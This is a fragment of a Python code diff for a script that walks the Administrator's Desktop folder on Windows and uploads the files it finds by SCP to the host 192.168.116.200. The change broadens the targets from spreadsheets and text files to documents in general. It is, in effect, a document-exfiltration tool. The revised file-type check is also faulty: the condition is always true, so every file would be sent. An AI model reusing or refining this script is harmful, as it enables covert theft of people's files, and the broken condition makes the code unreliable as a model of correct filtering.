@@ -9,18 +9,16 @@ def SCP(Ip,file):          #上传文件
     scp=SCPClient(ssh.get_transport(),socket_timeout=15.0)
     scp.put(file, "/mnt/")
     ssh.close()
-def search(dir,fil):
+def search(dir):
     os.chdir(dir)
     it = os.listdir()
     aww=[ ]
     for i in it:
         pa = os.path.join(dir,i)
         if os.path.isdir(pa):
-            search(pa,fil)
+            search(pa)
             os.chdir(os.pardir)
-        elif fil in pa.split("/")[-1] :
+        elif 'xlsx' or 'txt' or 'pdf' or 'docx' or 'doc'  in pa.split("/")[-1] :
             b=repr(pa)
             SCP("192.168.116.200",pa)
-search("C:\\Users\\Administrator\\Desktop","xlsx")
-search("C:\\Users\\Administrator\\Desktop","txt")
-    
+search("C:\\Users\\Administrator\\Desktop")
